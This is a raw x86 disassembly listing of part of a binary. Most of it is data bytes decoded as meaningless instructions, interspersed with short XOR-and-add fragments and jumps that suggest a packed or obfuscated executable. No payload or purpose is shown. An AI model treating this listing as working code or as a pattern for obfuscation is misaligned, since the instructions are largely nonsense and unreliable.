  4079d4:	xor    DWORD PTR [ecx*4+0x5b65bff9],esi
  4079db:	mov    esp,0x87b9356a
  4079e0:	cmc    
  4079e1:	lods   al,BYTE PTR ds:[esi]
  4079e2:	push   eax
  4079e3:	sbb    BYTE PTR [ebx+0x37036cbf],dh
  4079e9:	ins    BYTE PTR es:[edi],dx
  4079ea:	or     al,0xdd
  4079ec:	add    al,0x1e
  4079ee:	xor    eax,0x26be61ed
  4079f3:	aam    0xdb
  4079f5:	jl     0x407a0c
  4079f7:	jnp    0x4079f6
  4079f9:	les    esi,FWORD PTR [esi+0x29]
  4079fc:	setbe  BYTE PTR [edi-0x4]
  407a00:	mov    eax,0x769320fb
  407a05:	mov    cl,0xde
  407a07:	xchg   BYTE PTR [edx-0x80],bl
  407a0a:	xchg   esi,eax
  407a0b:	shr    DWORD PTR [ecx+0x1f],0x17
  407a0f:	xor    BYTE PTR [edx+0x4880c555],ah
  407a15:	add    BYTE PTR [ebp+0x56af1f84],cl
  407a1b:	in     eax,dx
  407a1c:	adc    al,0xb7
  407a1e:	cmp    dl,BYTE PTR [ecx+0x63]
  407a21:	retf   
  407a22:	fs push ds
  407a24:	sbb    esi,esp
  407a26:	(bad)  
  407a28:	out    0x20,al
  407a2a:	xchg   ebx,eax
  407a2b:	mov    esp,0xfd304ece
  407a30:	mov    ecx,0xe5c78df8
  407a35:	pop    esi
  407a36:	xchg   esp,eax
  407a37:	lock loope 0x407a42
  407a3a:	pop    ss
  407a3b:	xchg   DWORD PTR [esi+0x48],edi
  407a3e:	stc    
  407a3f:	imul   edi,DWORD PTR cs:[edi-0x2],0xffffff8b
  407a44:	xor    ebx,DWORD PTR [eax+0x58fde5bf]
  407a4a:	mov    ebx,0x86aeb807
  407a4f:	popf   
  407a50:	mov    edi,0x22c4d449
  407a55:	popf   
  407a56:	xchg   ebx,eax
  407a57:	or     BYTE PTR [edx+0x7],dl
  407a5a:	mov    BYTE PTR ds:0x12c4135f,bh
  407a60:	ins    DWORD PTR es:[edi],dx
  407a61:	pop    esi
  407a62:	addr16 mov ebx,0x9d67504e
  407a68:	in     al,0x47
  407a6a:	icebp  
  407a6b:	inc    edx
  407a6c:	xchg   esi,eax
  407a6d:	or     DWORD PTR [edx+0x9153f7e],ebx
  407a73:	and    esp,DWORD PTR [ecx+0x40dd5dd0]
  407a79:	cmp    al,0xc5
  407a7b:	inc    BYTE PTR [edx]
  407a7d:	ret    0x8009
  407a80:	scas   al,BYTE PTR es:[edi]
  407a81:	inc    ebp
  407a82:	fst    QWORD PTR [eax]
  407a84:	pop    esi
  407a85:	mov    cl,0x3e
  407a87:	push   ebp
  407a88:	mov    al,ds:0x2277e014
  407a8d:	ins    DWORD PTR es:[edi],dx
  407a8e:	and    al,0x53
  407a90:	sbb    edx,DWORD PTR [ebp+0x45]
  407a93:	xor    BYTE PTR [ebp+0x1f6cd7f4],ah
  407a99:	add    BYTE PTR [ebx-0x5b],0x64
  407a9d:	jb     0x407b1d
  407a9f:	sbb    ch,ch
  407aa1:	repnz and DWORD PTR [ebp-0x7116cb0f],ebp
  407aa8:	or     eax,0xefb9e5b5
  407aad:	pop    es
  407aae:	add    dh,BYTE PTR [edx+0x2f3b024f]
  407ab4:	scas   al,BYTE PTR es:[edi]
  407ab5:	sbb    eax,esi
  407ab7:	push   0xffffffed
  407ab9:	(bad)  
  407aba:	lock fdiv DWORD PTR [ecx]
  407abd:	mov    ds:0xb607186a,eax
  407ac2:	shl    ebp,cl
  407ac4:	fild   WORD PTR [ebp-0x1d]
  407ac7:	sub    dl,BYTE PTR [esi+edx*8]
  407aca:	pop    eax
  407acb:	pop    es
  407acc:	push   edi
  407acd:	and    al,0x78
  407acf:	add    BYTE PTR [ecx+0x38329495],bh
  407ad5:	push   edx
  407ad6:	adc    bh,dh
  407ad8:	retf   
  407ad9:	cli    
  407ada:	enter  0xe88e,0x5e
  407ade:	xor    DWORD PTR [esi],0x28bde59
  407ae4:	push   esp
  407ae5:	xor    ebx,ecx
  407ae7:	mov    bl,0x30
  407ae9:	push   0xffffffe7
  407aeb:	mov    al,0xdf
  407aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aee:	mov    ebp,esp
  407af0:	pop    ebp
  407af1:	int    0x0
  407af3:	test   BYTE PTR [ebx],dh
  407af5:	mov    ecx,0x8ce11272
  407afa:	mov    eax,DWORD PTR es:[ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	icebp  
  407b34:	mov    ecx,0xd6591797
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407bb6
  407b40:	fdivr  DWORD PTR [ecx-0x71]
  407b43:	in     al,0x55
  407b45:	(bad)  
  407b46:	cmp    eax,0x1066c4c0
  407b4b:	mov    ah,BYTE PTR [ecx-0x57170b62]
  407b51:	paddusb mm6,QWORD PTR [ecx+eax*4]
  407b55:	mov    eax,0xfe86be9
  407b5a:	ret    
  407b5b:	fild   WORD PTR [edi+esi*1]
  407b5e:	and    al,0xfb
  407b60:	retf   
  407b61:	mov    bh,0x1b
  407b63:	or     BYTE PTR ds:0xfd9f9562,dl
  407b69:	dec    eax
  407b6a:	repnz xor DWORD PTR [edi],ebp
  407b6d:	jg     0x407af3
  407b6f:	xchg   ecx,eax
  407b70:	mov    DWORD PTR [eax],esi
  407b72:	pop    edx
  407b73:	lods   eax,DWORD PTR ds:[esi]
  407b74:	push   edx
  407b75:	xchg   ecx,eax
  407b76:	mov    eax,0x65843f4d
  407b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b7c:	push   esp
  407b7d:	(bad)  
  407b7e:	stc    
  407b7f:	call   0x9ad32d2
  407b84:	jns    0x407beb
  407b86:	xchg   esp,eax
  407b87:	repz pop ss
  407b89:	je     0x407b6f
  407b8b:	aas    
  407b8c:	aad    0x12
  407b8e:	call   0x5c7b:0xa714b175
  407b95:	sub    eax,eax
  407b97:	das    
  407b98:	in     al,0xd2
  407b9a:	xor    DWORD PTR ds:0xdc926c99,esi
  407ba0:	or     BYTE PTR [ebx+0x1dc97cfc],bh
  407ba6:	pop    es
  407ba7:	mov    dh,0x80
  407ba9:	sbb    DWORD PTR [ecx],esi
  407bab:	hlt    
  407bac:	pop    ss
  407bad:	sbb    eax,0xbaeb94bd
  407bb2:	sub    BYTE PTR [ebp+0xa],cl
  407bb5:	mov    eax,0xe2d13211
  407bba:	fcom   QWORD PTR [ecx-0x4d]
  407bbd:	out    0xdf,eax
  407bbf:	lahf   
  407bc0:	mov    ecx,0x428d3df6
  407bc5:	les    esp,FWORD PTR [edx]
  407bc7:	hlt    
  407bc8:	or     DWORD PTR [eax-0x35],0xffffffd3
  407bcc:	sub    BYTE PTR [ecx],ch
  407bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bcf:	int    0xa9
  407bd1:	xor    eax,esi
  407bd3:	(bad)  
  407bd4:	and    eax,0x4ad79634
  407bd9:	(bad)  
  407bda:	cli    
  407bdb:	(bad)  
  407bdc:	into   
  407bdd:	mov    dl,0x22
  407bdf:	cld    
  407be0:	cmp    eax,0x67276f53
  407be5:	add    al,0x64
  407be7:	adc    esi,DWORD PTR [ebx-0x7e]
  407bea:	push   esi
  407beb:	(bad)  
  407bec:	push   ds
  407bed:	adc    esp,DWORD PTR [eax+0x18]
  407bf0:	(bad)  
  407bf1:	test   al,0xd7
  407bf3:	cwde   
  407bf4:	cli    
  407bf5:	lods   al,BYTE PTR ds:[esi]
  407bf6:	ror    BYTE PTR [edx],cl
  407bf8:	pop    edi
  407bf9:	sbb    eax,eax
  407bfb:	out    0x70,al
  407bfd:	inc    eax
  407bfe:	mov    esi,0x9b7fc55b
  407c03:	inc    ebx
  407c04:	outs   dx,BYTE PTR ds:[esi]
  407c05:	shl    DWORD PTR [ecx+ebx*2+0x6d],1
  407c09:	xchg   ecx,eax
  407c0a:	mov    ecx,0x79643a24
  407c0f:	sbb    DWORD PTR [ebx-0x558f920d],0x7e4eae38
  407c19:	mov    edx,0x9c85d0cc
  407c1e:	ds mov cl,0xdb
  407c21:	mov    eax,0xc263b15a
  407c26:	das    
  407c27:	loopne 0x407baa
  407c29:	xchg   ebx,eax
  407c2a:	push   es
  407c2b:	mov    al,0x46
  407c2d:	(bad)  
  407c2e:	out    0x28,eax
  407c30:	adc    esp,DWORD PTR [ebp-0x21]
  407c33:	ficom  DWORD PTR [ebp-0x11d780e]
  407c39:	out    dx,al
  407c3a:	push   ebp
  407c3b:	in     al,0x9a
  407c3d:	push   ebp
  407c3e:	add    al,0x6f
  407c40:	pusha  
  407c41:	push   eax
  407c42:	cmp    ah,BYTE PTR [ebx+ebx*2+0x32]
  407c46:	scas   eax,DWORD PTR es:[edi]
  407c47:	add    DWORD PTR [ebx+esi*4+0x33],edi
  407c4b:	enter  0xbc25,0x26
  407c4f:	cld    
  407c50:	sub    al,0xae
  407c52:	jae    0x407bda
  407c54:	jle    0x407cd5
  407c56:	stos   BYTE PTR es:[edi],al
  407c57:	jge    0x407caf
  407c59:	ret    
  407c5a:	mov    ds:0x7be72f61,al
  407c5f:	lods   eax,DWORD PTR ds:[esi]
  407c60:	mov    ebp,0xd1d18383
  407c65:	or     eax,0xfcf89ca6
  407c6a:	pop    ds
  407c6b:	(bad)  
  407c6c:	(bad)  
  407c6d:	mov    esp,0x6ef758bc
  407c72:	inc    esp
  407c73:	outs   dx,DWORD PTR ds:[esi]
  407c74:	push   esi
  407c75:	jnp    0x407c4d
  407c77:	shl    DWORD PTR [eax-0x6166cc3d],cl
  407c7d:	dec    esp
  407c7e:	cmp    eax,0x4b680a71
  407c83:	loope  0x407cfa
  407c85:	arpl   WORD PTR [eax-0x64877506],ax
  407c8b:	and    al,0x78
  407c8d:	and    al,0xbd
  407c8f:	jns    0x407c63
  407c91:	jle    0x407d04
  407c93:	xor    ebx,DWORD PTR es:[ebx-0x52db820d]
  407c9a:	mov    edi,0x713c43c5
  407c9f:	and    ah,BYTE PTR [ecx-0x7d]
  407ca2:	mov    ebx,0x7cfe33e8
  407ca7:	mov    al,ds:0xc8b287da
  407cac:	mov    ch,0x37
  407cae:	push   eax
  407caf:	mov    esi,0x5f46104b
  407cb4:	out    dx,eax
  407cb5:	add    eax,0x83ebf9c3
  407cba:	add    eax,0xdff8b0bc
  407cbf:	xchg   edx,eax
  407cc0:	mov    eax,0x99b70609
  407cc5:	adc    ebx,DWORD PTR [edx+ebx*2]
  407cc8:	add    BYTE PTR [esi+0x21],al
  407ccb:	dec    ebp
  407ccc:	add    BYTE PTR [eax+0x63],0x39
  407cd0:	inc    eax
  407cd1:	daa    
  407cd2:	sbb    esi,ecx
  407cd4:	lahf   
  407cd5:	inc    edx
  407cd6:	push   cs
  407cd7:	aad    0xfe
  407cd9:	jno    0x407c90
  407cdb:	dec    edx
  407cdc:	cmp    dl,BYTE PTR [edx]
  407cde:	push   esi
  407cdf:	xchg   ebp,ecx
  407ce1:	mov    eax,0x97c345bc
  407ce6:	add    cl,BYTE PTR [esi+0x3a]
  407ce9:	cdq    
  407cea:	xor    DWORD PTR [edx],0xffffffec
  407ced:	ror    BYTE PTR [ebx],cl
  407cef:	repnz iret 
  407cf1:	xlat   BYTE PTR ds:[ebx]
  407cf2:	sub    DWORD PTR [edi],0xffffffde
  407cf5:	xor    dh,BYTE PTR [ecx+0x52005bfe]
  407cfb:	data16 fisubr DWORD PTR [eax-0x4c7cdcea]
  407d02:	and    al,0xbd
  407d04:	fwait
  407d05:	xor    bh,BYTE PTR [ebx]
  407d07:	mov    al,ds:0x86dd0f56
  407d0c:	fcos   
  407d0e:	pushf  
  407d0f:	jb     0x407d7d
  407d11:	out    dx,al
  407d12:	shl    DWORD PTR [ebx+esi*1],cl
  407d15:	fisttp DWORD PTR [edx]
  407d17:	mov    ds:0xc98c67f8,eax
  407d1c:	(bad)  [esi]
  407d1e:	test   al,0x77
  407d20:	xchg   edx,eax
  407d21:	or     ebx,edx
  407d23:	jg     0x407ced
  407d25:	mov    edi,0xfec74093
  407d2a:	jbe    0x407d89
  407d2c:	adc    ebp,DWORD PTR [ecx]
  407d2e:	inc    ebp
  407d2f:	sbb    al,0x7a
  407d31:	inc    esi
  407d32:	jo     0x407d6d
  407d34:	(bad)  
  407d35:	enter  0x4d23,0x7
  407d39:	(bad)  
  407d3a:	sub    ebx,DWORD PTR [ebp-0x5e28ad49]
  407d40:	mov    BYTE PTR [ebp+ebp*1-0x41a2e78f],cl
  407d47:	call   0xe372:0x56c57101
  407d4e:	xchg   edi,eax
  407d4f:	jp     0x407dcc
  407d51:	push   ss
  407d52:	lods   al,BYTE PTR ds:[esi]
  407d53:	fnstcw WORD PTR ds:0x410d0379
  407d59:	mov    cl,dl
  407d5b:	call   0x6969:0xfaba36fc
  407d62:	mov    dh,0x78
  407d64:	inc    ecx
  407d65:	inc    ecx
  407d66:	out    0x21,al
  407d68:	lock mov bl,0x8b
  407d6b:	out    0x26,al
  407d6d:	cdq    
  407d6e:	fdivrp st(4),st
  407d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d71:	fisub  DWORD PTR [edx]
  407d73:	push   ecx
  407d74:	outs   dx,DWORD PTR ds:[esi]
  407d75:	arpl   WORD PTR [edi+0x7a8ec65c],si
  407d7b:	sbb    al,0x33
  407d7d:	cmp    esp,ebp
  407d7f:	out    0xb6,al
  407d81:	out    dx,eax
  407d82:	test   BYTE PTR [edi],ch
  407d84:	and    al,0x5a
  407d86:	xlat   BYTE PTR ds:[ebx]
  407d87:	pop    edx
  407d88:	fstp   QWORD PTR [edx]
  407d8a:	dec    ecx
  407d8b:	fsubr  QWORD PTR [ebp+edi*2-0x718c34ef]
  407d92:	stc    
  407d93:	mov    esp,fs
  407d95:	(bad)  
  407d96:	mov    DWORD PTR [edi],0x50824a51
  407d9c:	pop    ss
  407d9d:	lods   eax,DWORD PTR ds:[esi]
  407d9e:	sub    eax,DWORD PTR [edx-0x3b]
  407da1:	cmp    ecx,DWORD PTR [edi]
  407da3:	mov    ebx,0xcace5b62
  407da8:	idiv   DWORD PTR [edx+0x22944361]
  407dae:	repnz hlt 
  407db0:	sbb    dl,BYTE PTR [ebx]
  407db2:	pop    ebx
  407db3:	lahf   
  407db4:	gs int 0x1
  407db7:	das    
  407db8:	sti    
  407db9:	ins    DWORD PTR es:[edi],dx
  407dba:	jle    0x407d53
  407dbc:	or     DWORD PTR [eax-0x356daa9f],ebp
  407dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dc3:	xchg   ebp,eax
  407dc4:	sub    eax,0x9893aa53
  407dc9:	push   esi
  407dca:	rcr    BYTE PTR [ebp+0x55],1
  407dcd:	push   DWORD PTR [esi]
  407dcf:	dec    esp
  407dd0:	mov    esi,0x20a7eb4e
  407dd5:	ret    
  407dd6:	add    ecx,ecx
  407dd8:	cmc    
  407dd9:	shl    BYTE PTR [edx+edi*2+0x751d8898],1
  407de0:	jnp    0x407dfa
  407de2:	mov    edi,0xc20be199
  407de7:	pop    ebx
  407de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dea:	pop    ss
  407deb:	call   FWORD PTR [edi+0x7b5ef11f]
  407df1:	jb     0x407d84
  407df3:	push   ds
  407df4:	mov    bh,0x99
  407df6:	inc    ecx
  407df7:	mov    cl,0xc
  407df9:	arpl   di,bx
  407dfb:	mov    al,0x8f
  407dfd:	cmp    BYTE PTR [esi-0x58c5e92e],dh
  407e03:	aas    
  407e04:	xor    eax,0x65724536
  407e09:	mov    bh,0xad
  407e0b:	imul   ebp,DWORD PTR [edx+0x348aaefa],0xffffffe5
  407e12:	cmp    eax,0xa8bd148c
  407e17:	lahf   
  407e18:	jnp    0x407e3c
  407e1a:	in     al,0x5d
  407e1c:	add    DWORD PTR [ebx-0xaef1546],ecx
  407e22:	shr    BYTE PTR [ebp-0x3b],0xd5
  407e26:	ret    
  407e27:	add    eax,0x49e06d56
  407e2c:	mov    ds:0xeec2c701,al
  407e31:	pop    ecx
  407e32:	sbb    DWORD PTR [ebp+0x66],eax
  407e35:	sub    esp,DWORD PTR [ecx]
  407e37:	or     BYTE PTR es:[edx+esi*2],0xb3
  407e3c:	cmp    ah,ah
  407e3e:	stc    
  407e3f:	into   
  407e40:	(bad)
  407e43:	add    eax,0x598c2941
  407e48:	call   0x6d53:0x6fec1484
  407e4f:	sub    ah,bh
  407e51:	jecxz  0x407ec3
  407e53:	pop    edi
  407e54:	inc    eax
  407e55:	mov    ds:0xd3462666,eax
  407e5a:	lock pop es
  407e5c:	ins    BYTE PTR es:[edi],dx
  407e5d:	mov    ds:0xb7241e23,eax
  407e62:	add    DWORD PTR [ecx-0x17e11b56],eax
  407e68:	je     0x407e48
  407e6a:	pusha  
  407e6b:	adc    edi,DWORD PTR [ebp-0x506d9e84]
  407e71:	push   ebp
  407e72:	out    0x92,al
  407e74:	test   eax,0x628ca1d7
  407e79:	xchg   ecx,eax
  407e7a:	out    dx,eax
  407e7b:	pop    esp
  407e7c:	outs   dx,BYTE PTR ds:[esi]
  407e7d:	mov    esp,0xb271de19
  407e82:	(bad)  
  407e83:	shl    DWORD PTR [ebp-0x3ff44219],1
  407e89:	inc    esi
  407e8a:	cmp    al,0x23
  407e8c:	xchg   ebx,eax
  407e8d:	clc    
  407e8e:	push   edx
  407e8f:	ret    
  407e90:	cmp    ch,BYTE PTR [esi+esi*2-0x46fd4d9d]
  407e97:	nop
  407e98:	pop    edx
  407e99:	mov    edi,0xea196cfb
  407e9e:	pop    edi
  407e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ea0:	test   DWORD PTR [ebp+0x51],edx
  407ea3:	jnp    0x407e94
  407ea5:	stos   DWORD PTR es:[edi],eax
  407ea6:	dec    edi
  407ea7:	inc    edi
  407ea8:	cmp    eax,0xc802b9c4
  407ead:	pop    es
  407eae:	js     0x407ecc
  407eb0:	xchg   ebx,eax
  407eb1:	mov    bh,0xd5
  407eb3:	pop    ebp
  407eb4:	dec    esi
  407eb5:	lock pop edx
  407eb7:	mov    ds:0xa5b72ebc,eax
  407ebc:	pop    ebp
  407ebd:	out    0x35,al
  407ebf:	or     BYTE PTR [ebx+edx*1],bl
  407ec2:	add    eax,0x2f8c560a
  407ec7:	sbb    eax,0xc659c737
  407ecc:	inc    edi
  407ecd:	js     0x407f1d
  407ecf:	ret    0x1a35
  407ed2:	add    BYTE PTR [ebp-0x545f6d71],ah
  407ed8:	or     BYTE PTR [edi+ecx*1+0x1],ah
  407edc:	sbb    bl,cl
  407ede:	fisub  WORD PTR [edi-0x2d]
  407ee1:	mov    WORD PTR [ebp-0x79459ef2],fs
  407ee7:	sub    esp,eax
  407ee9:	cmp    BYTE PTR [ebx+0x13840114],al
  407eef:	es dec esp
  407ef1:	and    al,0xc1
  407ef3:	sbb    ecx,esp
  407ef5:	jl     0x407e81
  407ef7:	fstp   DWORD PTR [edi-0x7fd5bd4a]
  407efd:	xor    esp,DWORD PTR [ebx+0x10]
  407f00:	bound  esi,QWORD PTR [esi-0x62ced5b]
  407f06:	pusha  
  407f07:	or     DWORD PTR [ebx],eax
  407f09:	ret    
  407f0a:	cmp    bl,ah
  407f0c:	test   al,0x95
  407f0e:	out    dx,al
  407f0f:	sub    eax,0xf073b66
  407f14:	test   BYTE PTR [edi+0x0],al
  407f17:	add    BYTE PTR [eax],al
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407fed
  407f78:	(bad)  
  407f7a:	aam    0xaa
  407f7c:	sar    BYTE PTR [esi+0x7e],cl
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407f6c
  407f84:	scas   al,BYTE PTR es:[edi]
  407f85:	enter  0x6092,0xd1
  407f89:	icebp  
  407f8a:	mov    ds,WORD PTR [edi-0x4f8c89e0]
  407f90:	jo     0x408003
  407f92:	adc    ecx,DWORD PTR ds:0x67baa0a7
  407f98:	cmp    ebx,ecx
  407f9a:	mov    cl,0xda
  407f9c:	nop
  407f9d:	les    ecx,FWORD PTR [eax+eax*8+0x7c760aca]
  407fa4:	aam    0xd
  407fa6:	movntq QWORD PTR ds:0x58443ea5,mm6
  407fad:	xor    BYTE PTR [ecx+0x27e8fa45],0xad
  407fb4:	sbb    BYTE PTR [ebp+0x59],0xab
  407fb8:	(bad)  [edx+ecx*4+0x4f]
  407fbc:	pop    ecx
  407fbd:	mov    bh,0x84
  407fbf:	mov    bh,0x45
  407fc1:	and    BYTE PTR [eax+edx*4-0x29],0xe2
  407fc6:	xor    DWORD PTR [ebx-0x1932323f],0x2a
  407fcd:	mov    edx,?
  407fcf:	push   ss
  407fd0:	push   ebp
  407fd1:	adc    ah,BYTE PTR es:[ebx+0x2dcc7d3a]
  407fd8:	xor    esp,DWORD PTR [ebx+0x61]
  407fdb:	shr    BYTE PTR [ecx+edx*1-0x5a28c57f],0xc7
  407fe3:	xchg   esi,eax
  407fe4:	in     eax,0xe4
  407fe6:	dec    edx
  407fe7:	cmp    ebx,ebp
  407fe9:	test   eax,0xac4b8d47
  407fee:	imul   ecx,DWORD PTR [eax-0x60f2ebfd],0xbe808d47
  407ff8:	sub    ch,BYTE PTR [edx]
  407ffa:	cwde   
  407ffb:	mov    bh,0x9d
  407ffd:	xchg   ecx,eax
  407ffe:	inc    edx
  407fff:	in     al,0xf1
  408001:	push   0x6b
  408003:	sbb    eax,0x6e92521c
  408008:	call   0x9160:0x2a6d0986
  40800f:	adc    edx,DWORD PTR [esp+ebx*4]
  408012:	xchg   ecx,eax
  408013:	shr    DWORD PTR gs:[eax*4+0x5bf34a15],1
  40801b:	cmp    esi,DWORD PTR [ebp+0x4b]
  40801e:	js     0x407fce
  408020:	mov    ebp,0xd401b0a4
  408025:	xchg   BYTE PTR [eax+0x76fb30a8],cl
  40802b:	jecxz  0x40805a
  40802d:	sub    ah,BYTE PTR ds:0x6a062ec7
  408033:	jns    0x407fe0
  408035:	ins    BYTE PTR es:[edi],dx
  408036:	ja     0x40802e
  408038:	outs   dx,BYTE PTR ds:[esi]
  408039:	dec    ebp
  40803a:	fst    QWORD PTR [esi+0xb11f947]
  408040:	pop    eax
  408041:	jp     0x4080b2
  408043:	dec    esi
  408044:	imul   edx,DWORD PTR [eax],0x57
  408047:	loopne 0x407fc9
  408049:	inc    edx
  40804a:	mov    dl,BYTE PTR [eax]
  40804c:	jmp    0xe119:0x32b44ad
  408053:	adc    bh,BYTE PTR [edx-0x41]
  408056:	test   eax,0xb4ccdb39
  40805b:	xchg   edx,eax
  40805c:	mov    edi,0x4db161d2
  408061:	and    esp,ecx
  408063:	add    dh,BYTE PTR [ebx-0x215995fd]
  408069:	call   0xfef0:0xfe18a0d8
  408070:	inc    esi
  408071:	sbb    DWORD PTR [ecx+0x54b21bc1],esp
  408077:	sbb    dh,0xe4
  40807a:	jno    0x40800c
  40807c:	pushf  
  40807d:	inc    ecx
  40807e:	sbb    DWORD PTR [esi+ebp*8+0x4a],ebx
  408082:	mov    esp,0x271d691a
  408087:	xchg   ecx,eax
  408088:	add    ebx,DWORD PTR [edx+0x16272b4c]
  40808e:	ins    BYTE PTR es:[edi],dx
  40808f:	ins    BYTE PTR es:[edi],dx
  408090:	push   ecx
  408091:	jl     0x4080f6
  408093:	shr    BYTE PTR [eax+0x42ac9aac],cl
  408099:	xchg   edi,eax
  40809a:	xor    eax,0x7b3e28ac
  40809f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080a0:	gs ins DWORD PTR es:[edi],dx
  4080a2:	cld    
  4080a3:	stos   BYTE PTR es:[edi],al
  4080a4:	adc    dh,BYTE PTR [ecx-0x296c0b5f]
  4080aa:	les    edx,FWORD PTR [edi]
  4080ac:	dec    ebx
  4080ad:	mov    ecx,0xda4ccc24
  4080b2:	test   al,0xbf
  4080b4:	outs   dx,BYTE PTR ds:[esi]
  4080b5:	js     0x408061
  4080b7:	lea    eax,[esi]
  4080b9:	rcr    DWORD PTR [ecx-0x7df662e4],1
  4080bf:	push   ds
  4080c0:	out    0x2d,al
  4080c2:	jmp    0x40805b
  4080c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080c5:	(bad)  
  4080c6:	mov    esp,0x17325edb
  4080cb:	addr16 lahf 
  4080cd:	outs   dx,DWORD PTR ds:[esi]
  4080ce:	cdq    
  4080cf:	cwde   
  4080d0:	inc    ebx
  4080d1:	xor    BYTE PTR [esi],ah
  4080d3:	fimul  DWORD PTR [ebx-0x2c]
  4080d6:	call   0x2573:0x57d6334a
  4080dd:	sub    esp,edi
  4080df:	xor    eax,0x7c787a08
  4080e4:	scas   eax,DWORD PTR es:[edi]
  4080e5:	int    0x74
  4080e7:	push   eax
  4080e8:	and    DWORD PTR [ebx-0x17],ecx
  4080eb:	pop    edx
  4080ec:	div    eax
  4080ee:	retf   0x953e
  4080f1:	cmp    bh,BYTE PTR [eax+0xba2e688]
  4080f7:	push   ecx
  4080f8:	mov    bh,cl
  4080fa:	repz pushf 
  4080fc:	(bad)  
  4080fe:	jl     0x4080fe
  408100:	xlat   BYTE PTR ds:[ebx]
  408101:	scas   eax,DWORD PTR es:[edi]
  408102:	push   es
  408103:	outs   dx,BYTE PTR ds:[esi]
  408104:	xor    eax,0x8d2ab147
  408109:	out    0x74,al
  40810b:	jmp    0x408179
  40810d:	scas   eax,DWORD PTR es:[edi]
  40810e:	or     al,0xd7
  408110:	sbb    al,0xc5
  408112:	ins    BYTE PTR es:[edi],dx
  408113:	(bad)  
  408114:	pop    ebx
  408115:	enter  0xdd78,0x99
  408119:	adc    al,ch
  40811b:	xchg   edx,ebx
  40811d:	dec    esp
  40811e:	push   ecx
  40811f:	fcom   st(4)
  408121:	addr16 cli 
  408123:	fs jae 0x408116
  408126:	sbb    eax,0x5fb53453
  40812b:	cs push ss
  40812d:	scas   eax,DWORD PTR es:[edi]
  40812e:	std    
  40812f:	xor    dl,BYTE PTR [ebx-0x47]
  408132:	xor    al,0xd2
  408134:	mov    bh,0x63
  408136:	and    al,0x5a
  408138:	stos   BYTE PTR es:[edi],al
  408139:	pop    eax
  40813a:	sbb    al,0xef
  40813c:	in     eax,dx
  40813d:	mov    ebp,0x716bc427
  408142:	cdq    
  408143:	neg    ah
  408145:	mov    ds:0xb3506484,al
  40814a:	cmp    ax,0xc44d
  40814e:	call   0x7937:0x19f5f216
  408155:	fldenv [edi+ebx*2+0x71]
  408159:	mov    ss,WORD PTR [esi]
  40815b:	int3   
  40815c:	stos   BYTE PTR es:[edi],al
  40815d:	sbb    eax,0x1f858d1b
  408162:	fdivr  DWORD PTR [ebp-0x49ed5123]
  408168:	xchg   esi,eax
  408169:	dec    edi
  40816a:	dec    ecx
  40816b:	mov    cl,0xc2
  40816d:	mov    bl,0x94
  40816f:	(bad)  
  408170:	outs   dx,BYTE PTR ds:[esi]
  408171:	sbb    BYTE PTR [ebp-0x80],bh
  408174:	jle    0x4081ca
  408176:	mov    ds:0xb9956996,al
  40817b:	pop    esi
  40817c:	lahf   
  40817d:	sbb    DWORD PTR [edi-0x68],0x30
  408181:	lahf   
  408182:	sar    DWORD PTR [edx+0x130e5896],0xf9
  408189:	call   0xe18a:0x73016d8c
  408190:	mov    bl,0x22
  408192:	xchg   edi,eax
  408193:	in     al,dx
  408194:	jge    0x408209
  408196:	cmc    
  408197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408198:	dec    ebp
  408199:	cs push esi
  40819b:	fwait
  40819c:	data16 clc 
  40819e:	ja     0x408210
  4081a0:	(bad)  
  4081a1:	mov    bl,0xac
  4081a3:	xor    ecx,DWORD PTR [ebx+0x3]
